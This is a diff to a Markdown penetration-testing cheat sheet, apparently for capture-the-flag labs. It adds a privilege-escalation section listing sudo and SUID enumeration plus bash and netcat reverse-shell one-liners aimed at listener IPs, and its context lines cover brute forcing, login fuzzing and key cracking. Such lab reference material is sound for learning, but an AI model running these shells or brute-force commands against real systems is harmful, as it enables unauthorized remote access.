@@ -13,7 +13,6 @@
     * [Gobuster](#gobuster)
     * [Nmap](#nmap)
     * [Rustscan](#rustscan)
-    * [Wpscan](#wpscan)
   * [Exploitation](#exploitation)
     * [Hydra](#hydra)
     * [Evil-winrm](#evil-winrm)
@@ -27,6 +26,10 @@
     * [Smbclient](#smbclient)
     * [Socat](#socat) 
     * [Viper Monkey](#viper-monkey)
+  * [Priviledge Escalation](#priviledge-escalation)
+    * [Reverse Shell](#reverse-shell)
+    
+
 
 
 * [Cryptography](#Cryptography)
@@ -68,7 +71,7 @@ dirsearh -u http://google.com -e php,html,js,txt
 ```
 dirsearch -u http://hackme.my.id/ -e php,html,js,txt
 ```
-
+---------------------------------------------------------------------------
 ## Gobuster
 ### 𝚰. Gobuster Dir
 - ### Find Website Directory 
@@ -98,7 +101,7 @@ gobuster dns -d [domain] -w [path to wordlist] -i
 ```
 gobuster dns test.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -i 
 ```
-
+---------------------------------------------------------------------------
 ## Enum4linux
 - ###  Enumerate Windows and SMB Shares
 enum4linux [IP Target]
@@ -197,22 +200,7 @@ rustscan [IP Target] --ulimit 5000
 ```
 rustscan 10.10.10.11 --ulimit 5000 
 ```
-## Wpscan
-- ###  Wordpress Scanning
-wpscan --url google.com
-###### Example :
-```
-wpscan --url blog.thm 
-```
-- ###  Wordpress Enumerate User
-wpscan --url google.com --enumerate u
-###### Example :
-```
-wpscan --url blog.thm --enumerate u 
-```
-
-
-------------------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------
 - # Exploitaion
 ## Hydra
 - ### FTP Bruteforce
@@ -356,7 +344,7 @@ smbclient //[IP Target]/backup -U '[domain]'
 ```
 smbclient //10.10.10.11/backup -U 'svc-admin'
 ```
-
+---------------------------------------------------------------------------
 ## Socat
 - ###  Fork SSH in the specific port from Target Machine
 First Install [Socat Binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat), After that run the binary.
@@ -445,7 +433,7 @@ ffuf -w /usr/share/wordlists/dirb/big.txt -X POST -d "username=FUZZ&email=x&pass
 ```
 ffuf -w ./your_valid_usernames.txt:W1,./your-wordlists:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.62.169/customers/login -fc 200 
 ```
-
+---------------------------------------------------------------------------
 
 ## PrintSpoofer
 - ###  Windows Priviledge Escalation
@@ -454,6 +442,7 @@ Software .exe -> https://github.com/dievus/printspoofer
 ```
 PrintSpoofer.exe -i -c cmd 
 ```
+---------------------------------------------------------------------------
 ## Peass-ng
 - [Link Repo PEASS](https://github.com/carlospolop/PEASS-ng)
 - [Install PEASS](https://github.com/carlospolop/PEASS-ng/releases/)
@@ -498,9 +487,50 @@ Run the file
 ```
 .\winPEASx64.exe
 ```
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Priviledge Escalation
+## Reverse Shell
+- ### Listing priviledge file 
+###### Example :
+```
+sudo -l 
+```
+- ### Finding suid file  
+###### Example :
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+- ### Bash
+### 𝚰. Bash TCP
+###### Example :
+```
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1  
+```
+### 𝚰𝚰. Bash exec
+ 
+###### Example :
+```
+bash -c 'exec bash -i &>/dev/tcp/10.18.80.154/9999 <&1'  
+```
+
+- ### Netcat
+### 𝚰. Netcat /bin/sh 
+###### Example :
+```
+nc -e /bin/sh 10.0.0.1 1234  
+```
+### 𝚰𝚰. Netcat /tmp/f
+ 
+###### Example :
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.80.154 9999 >/tmp/f  
+```
 
 
 
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Cryptography
 ## John The Ripper
@@ -578,7 +608,7 @@ ssh2john id_rsa.rsa > id_rsa.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt
 ```
 
----------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Command
 
@@ -670,3 +700,4 @@ ooooooooooooooooooooooooooooooooooo
 ```
 
 ---------------------------------------------------------------------------
+
